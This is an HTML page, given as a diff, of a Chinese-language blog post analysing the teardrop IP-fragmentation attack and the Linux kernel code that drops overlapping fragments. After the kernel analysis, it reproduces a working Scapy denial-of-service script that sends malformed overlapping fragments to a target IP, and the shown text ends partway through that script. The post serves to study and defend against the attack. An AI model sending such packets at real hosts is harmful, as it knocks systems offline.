@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/embpgp.github.io/function%20()%20%7B%0A%20%20%20%20%20%20for%20(var%20_len2%20=%20arguments.length,%20args%20=%20new%20Array(_len2),%20_key2%20=%200;%20_key2%20%3C%20_len2;%20_key2++)%20%7B%0A%20%20%20%20%20%20%20%20args%5B_key2%5D%20=%20arguments%5B_key2%5D;%0A%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20return%20obj%5Bval%5D.apply(obj,%20args);%0A%20%20%20%20%7D">
+
+<link rel="stylesheet" href="/embpgp.github.io/css/main.css">
+
+
+<link rel="stylesheet" href="/embpgp.github.io/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"embpgp.github.io","root":"/embpgp.github.io/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="按照要求要丢弃掉这种数据包…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="teardrop分析">
+<meta property="og:url" content="https://embpgp.github.io/2017/10/18/teardrop%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="rutk1t0r&#39;s blog">
+<meta property="og:description" content="按照要求要丢弃掉这种数据包…">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://embpgp.github.io/images/teardrop_attack_tcpdump.png">
+<meta property="og:image" content="https://embpgp.github.io/images/teardrop_attack_printk.png">
+<meta property="article:published_time" content="2017-10-18T07:13:09.000Z">
+<meta property="article:modified_time" content="2025-03-11T12:14:38.967Z">
+<meta property="article:author" content="rutk1t0r">
+<meta property="article:tag" content="Linux kernel">
+<meta property="article:tag" content="network security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://embpgp.github.io/images/teardrop_attack_tcpdump.png">
+
+<link rel="canonical" href="https://embpgp.github.io/2017/10/18/teardrop%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>teardrop分析 | rutk1t0r's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/embpgp.github.io/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rutk1t0r's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Developer and Researcher</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/embpgp.github.io/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/embpgp.github.io/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/embpgp.github.io/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">29</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/embpgp.github.io/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/embpgp.github.io/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">39</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/embpgp.github.io/schedule/notes.html" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://embpgp.github.io/2017/10/18/teardrop%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/embpgp.github.io/images/avatar.png">
+      <meta itemprop="name" content="rutk1t0r">
+      <meta itemprop="description" content="gnireenigne 0x41414141 \xff\xe4\xcc">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rutk1t0r's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          teardrop分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-10-18 15:13:09" itemprop="dateCreated datePublished" datetime="2017-10-18T15:13:09+08:00">2017-10-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-03-11 20:14:38" itemprop="dateModified" datetime="2025-03-11T20:14:38+08:00">2025-03-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/embpgp.github.io/categories/study/" itemprop="url" rel="index"><span itemprop="name">study</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>6.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>6 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>按照要求要丢弃掉这种数据包…</p>
+</blockquote>
+<span id="more"></span>
+
+<hr>
+<p>参考资料:<br><a target="_blank" rel="noopener" href="http://blog.csdn.net/opens_tym/article/details/17737419">http://blog.csdn.net/opens_tym/article/details/17737419</a><br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000008836467">https://segmentfault.com/a/1190000008836467</a><br><a target="_blank" rel="noopener" href="http://zgykill.lofter.com/tag/Linux">http://zgykill.lofter.com/tag/Linux</a><br><a target="_blank" rel="noopener" href="https://www.juniper.net/documentation/en_US/junos/topics/concept/denial-of-service-os-teardrop-attack-understanding.html">https://www.juniper.net/documentation/en_US/junos/topics/concept/denial-of-service-os-teardrop-attack-understanding.html</a><br><a target="_blank" rel="noopener" href="http://www.nsfocus.net/index.php?act=magazine&do=view&mid=584">http://www.nsfocus.net/index.php?act=magazine&amp;do=view&amp;mid=584</a><br><a target="_blank" rel="noopener" href="https://www.samsclass.info/123/proj10/teardrop.htm">https://www.samsclass.info/123/proj10/teardrop.htm</a><br><a target="_blank" rel="noopener" href="https://yq.aliyun.com/articles/11345?spm=5176.100239.blogcont11018.9.W7XutP">https://yq.aliyun.com/articles/11345?spm=5176.100239.blogcont11018.9.W7XutP</a></p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>teardrop主要是利用操作系统协议栈处理IP分片的时候,对于畸形数据包重叠其余分片来使得重组算法发生错误,轻则发生内存泄露重则造成宕机或者拒绝服务.可以参考绿盟分析Linux 2.0内核时期的漏洞原理.而从2.4开始内核就修复了这个漏洞,并尝试如果可能就尽量修复重叠的数据包.具体参见截取部分关键代码(net/ipv4/ip_fragment.c):</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We found where to put this one.  Check for overlap with</span></span><br><span class="line"><span class="comment"> * preceding fragment, and, if needed, align things so that</span></span><br><span class="line"><span class="comment"> * any overlaps are eliminated.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (prev) &#123;</span><br><span class="line">	<span class="keyword">int</span> i = (FRAG_CB(prev)-&gt;offset + prev-&gt;len) - offset;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		offset += i;</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (end &lt;= offset)</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		<span class="keyword">if</span> (!pskb_pull(skb, i))</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		<span class="keyword">if</span> (skb-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">			skb-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (next &amp;&amp; FRAG_CB(next)-&gt;offset &lt; end) &#123;</span><br><span class="line">	<span class="keyword">int</span> i = end - FRAG_CB(next)-&gt;offset; <span class="comment">/* overlap is &#x27;i&#x27; bytes */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (i &lt; next-&gt;len) &#123;</span><br><span class="line">		<span class="comment">/* Eat head of the next overlapped fragment</span></span><br><span class="line"><span class="comment">		 * and leave the loop. The next ones cannot overlap.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!pskb_pull(next, i))</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		FRAG_CB(next)-&gt;offset += i;</span><br><span class="line">		qp-&gt;q.meat -= i;</span><br><span class="line">		<span class="keyword">if</span> (next-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">			next-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		struct sk_buff *free_it = next;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Old fragment is completely overridden with</span></span><br><span class="line"><span class="comment">		 * new one drop it.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		next = next-&gt;next;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (prev)</span><br><span class="line">			prev-&gt;next = next;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			qp-&gt;q.fragments = next;</span><br><span class="line"></span><br><span class="line">		qp-&gt;q.meat -= free_it-&gt;len;</span><br><span class="line">		frag_kfree_skb(qp-&gt;q.net, free_it, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上述代码就是Linux内核用来尝试修复有重叠的分片,原则是如果跟前一个数据包有重叠,就丢弃掉本分片的重叠部分,而如果跟后面的所有数据包有重叠,就调整后面的分片包,释放或者调整其指针.因此这两处代码就是我们要做文章的地方.</p>
+<h1 id="丢包"><a href="#丢包" class="headerlink" title="丢包"></a>丢包</h1><p>改过之后的代码如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">/* We found <span class="built_in">where</span> to put this one.  Check <span class="keyword">for</span> overlap with</span><br><span class="line">	 * preceding fragment, and, <span class="keyword">if</span> needed, align things so that</span><br><span class="line">	 * any overlaps are eliminated.</span><br><span class="line">	 */</span><br><span class="line">	<span class="keyword">if</span> (prev) &#123;</span><br><span class="line">		int i = (FRAG_CB(prev)-&gt;offset + prev-&gt;len) - offset;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (i &gt; 0) &#123;</span><br><span class="line">			offset += i;</span><br><span class="line">			err = -EINVAL;</span><br><span class="line">			printk(<span class="string">&quot;############ overlap before package ****\n&quot;</span>);</span><br><span class="line">			ipq_kill(qp); //标记失效</span><br><span class="line">			goto err;</span><br><span class="line">			<span class="keyword">if</span> (end &lt;= offset)</span><br><span class="line">				goto err;</span><br><span class="line">			err = -ENOMEM;</span><br><span class="line">			<span class="keyword">if</span> (!pskb_pull(skb, i))</span><br><span class="line">				goto err;</span><br><span class="line">			<span class="keyword">if</span> (skb-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">				skb-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (next &amp;&amp; FRAG_CB(next)-&gt;offset &lt; end) &#123;</span><br><span class="line">		int i = end - FRAG_CB(next)-&gt;offset; /* overlap is <span class="string">&#x27;i&#x27;</span> bytes */</span><br><span class="line">		printk(<span class="string">&quot;overlap after package*****************\n&quot;</span>);</span><br><span class="line">		err=-EINVAL;</span><br><span class="line">		ipq_kill(qp);  //标记失效</span><br><span class="line">		goto err;</span><br><span class="line">		<span class="keyword">if</span> (i &lt; next-&gt;len) &#123;</span><br><span class="line">			/* Eat head of the next overlapped fragment</span><br><span class="line">			 * and leave the loop. The next ones cannot overlap.</span><br><span class="line">			 */</span><br><span class="line">			<span class="keyword">if</span> (!pskb_pull(next, i))</span><br><span class="line">				goto err;</span><br><span class="line">			FRAG_CB(next)-&gt;offset += i;</span><br><span class="line">			qp-&gt;q.meat -= i;</span><br><span class="line">			<span class="keyword">if</span> (next-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">				next-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line">			<span class="built_in">break</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			struct sk_buff *free_it = next;</span><br><span class="line"></span><br><span class="line">			/* Old fragment is completely overridden with</span><br><span class="line">			 * new one drop it.</span><br><span class="line">			 */</span><br><span class="line">			next = next-&gt;next;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (prev)</span><br><span class="line">				prev-&gt;next = next;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				qp-&gt;q.fragments = next;</span><br><span class="line"></span><br><span class="line">			qp-&gt;q.meat -= free_it-&gt;len;</span><br><span class="line">			frag_kfree_skb(qp-&gt;q.net, free_it, NULL);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>我们发现有重叠就把这个链表全部丢掉,为什么调用ipq_kill函数就行了呢?</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Kill ipq entry. It is not destroyed immediately,</span></span><br><span class="line"><span class="comment"> * because caller (and someone more) holds reference count.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ipq_kill</span><span class="params">(struct ipq *ipq)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	inet_frag_kill(&amp;ipq-&gt;q, &amp;ip4_frags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看内核代码注释就知道,然后跟进去.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inet_frag_kill</span><span class="params">(struct inet_frag_queue *fq, struct inet_frags *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (del_timer(&amp;fq-&gt;timer))</span><br><span class="line">		atomic_dec(&amp;fq-&gt;refcnt);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(fq-&gt;last_in &amp; INET_FRAG_COMPLETE)) &#123;</span><br><span class="line">		fq_unlink(fq, f);</span><br><span class="line">		atomic_dec(&amp;fq-&gt;refcnt);</span><br><span class="line">		fq-&gt;last_in |= INET_FRAG_COMPLETE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现只是删除了定时器并减少了引用计数.如果检测到包分片没有收完,则将fq从哈希链表中和lru链表中移除.并减少引用计数.置收完标志位.而虽然这个函数没有直接销毁这个队列链表,但是当ip_frag_queue返回的时候,再次调用ipq_put-&gt;inet_frag_put就知道了,原子性减1并测试是否为0,如果是,则直接调用inet_frag_destroy销毁整个分片队列并回收资源.在这里需要跟一下引用计数,看什么时候才为0,并且一开始被创建的时候是为1的,而每次定时器操作以及分片操作的时候会增加1,操作完之后又会put而减1.</p>
+<h1 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h1><p>从网络上down了一份如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">total = <span class="built_in">len</span>(sys.argv)</span><br><span class="line"><span class="keyword">if</span> total != <span class="number">3</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Performs teardrop attack from Kali Linux&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot; &quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Usage: ./tear TARGET-IP ATTACK-CODE&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   Attack Codes:&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   0: small payload (36 bytes), 2 packets, offset=3x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   1: large payload (1300 bytes), 2 packets, offset=80x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   2: large payload (1300 bytes), 12 packets, offset=80x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   3: large payload (1300 bytes), 2 packets, offset=3x8 bytes&quot;</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;   4: large payload (1300 bytes), 2 packets, offset=10x8 bytes&quot;</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">target=<span class="built_in">str</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">attack=sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Attacking target &#x27;</span> + target + <span class="string">&#x27; with attack &#x27;</span> + attack</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> attack == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 0&quot;</span></span><br><span class="line">  size=<span class="number">36</span></span><br><span class="line">  offset=<span class="number">3</span></span><br><span class="line">  load1=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  size=<span class="number">4</span></span><br><span class="line">  offset=<span class="number">18</span></span><br><span class="line">  load2=<span class="string">&quot;\x00&quot;</span>*size</span><br><span class="line"></span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span></span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load1)</span><br><span class="line">  send(j/load2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> attack == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Using attack 1&quot;</span></span><br><span class="line">  size=<span class="number">1300</span></span><br><span class="line">  offset=<span class="number">80</span></span><br><span class="line">  load=<span class="string">&quot;A&quot;</span>*size</span><br><span class="line">  </span><br><span class="line">  i=IP()</span><br><span class="line">  i.dst=target</span><br><span class="line">  i.flags=<span class="string">&quot;MF&quot;</span></span><br><span class="line">  i.proto=<span class="number">17</span></span><br><span class="line">  </span><br><span class="line">  j=IP()</span><br><span class="line">  j.dst=target</span><br><span class="line">  j.flags=<span class="number">0</span> </span><br><span class="line">  j.proto=<span class="number">17</span></span><br><span class="line">  j.frag=offset</span><br><span class="line">  </span><br><span class="line">  send(i/load)</span><br><span class="line">  send(j/load)</span><br><span class="line"></span><br><span 